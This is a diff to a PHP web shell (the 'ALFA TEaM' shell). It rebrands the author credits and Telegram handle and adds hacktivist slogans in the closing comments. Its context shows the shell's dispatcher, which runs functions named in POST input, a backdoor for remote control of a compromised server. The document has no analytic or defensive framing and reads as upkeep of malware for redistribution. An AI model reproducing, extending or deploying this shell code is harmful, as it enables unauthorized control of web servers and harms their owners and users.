@@ -1563,7 +1563,7 @@ $about_us = "<pre><center><img src='http://solevisible.com/images/farvahar-iran.
 <pre><center><img src='https://b.top4top.io/p_210130c5s0.gif'><br><b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
 <font color='#00A220'>Shell Coded By Trhacknon & Invisible (ALFA TEaM)</font><br>
 <font color='#00A220'>Contact : juliettakamorista@gmail.com</font><br>
-<font color='#00A220'>Telegram Channel: @trhacknon</font><br>
+<font color='#00A220'>Telegram Channel: @crazymarsupilami</font><br>
 <font color='#FFFFFF'>Skype : trhacknon.invisible</font><br>
 <font color='#FFFFFF'>Skype : trhacknon</font><br>
 <font color='#FF0000'>WE ARE ANONYMOUS</font><br>
@@ -6525,8 +6525,12 @@ if(!empty($_POST['a']) && function_exists('alfa' . $_POST['a']))
 call_user_func('alfa' . $_POST['a']);
 exit;
 /*
-#Persian Gulf For Ever
-#skype : sole.sad
-#skype : ehsan.invisible
+#By Trhacknon
+#With anonymous touch
+#We are anonymous
+#We dont forget
+#We dont forgive
+#EXPECT US 
+#Telegram Channel: @crazymarsupilami 
 */
 ?>
